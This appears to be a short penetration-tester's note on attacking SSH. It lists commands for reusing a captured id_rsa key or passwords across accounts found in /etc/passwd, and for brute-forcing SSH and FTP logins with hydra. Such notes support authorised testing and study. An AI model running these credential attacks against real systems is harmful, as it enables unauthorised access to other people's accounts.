---
title: ssh
aliases: []
tags:
- tool/ssh
- tool/hydra
category: tools
status: draft
date_created: '2026-08-26'
date_modified: '2026-08-26'
source: ssh.md
related_tools:
- '[[ssh]]'
- '[[hydra]]'
related_techniques:
- '[[t1008]]'
- '[[t1110]]'
related_tactics: []
related_services: []
related_os: []
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: ''
port: ''
protocol: ''
os: ''
---

# ssh

## Description
- techniques
    - if you have id_rsa or passwords, try them for all interactive accounts in /etc/shadow (password reuse)
        - `cat /etc/passwd | grep -v nologin | cut -d ":" -f 1`
    - if you have an id_rsa file
        - `chmod 400 id_rsa; ssh -i id_rsa username@$ip`
    - brute force
        - `hydra -L user.list -P password.list ssh://$ip`
            - <span style=color:orange>this is very slow - target ftp instead `hydra -l username -P mut_password.list ftp://$ip -t 64`</span>

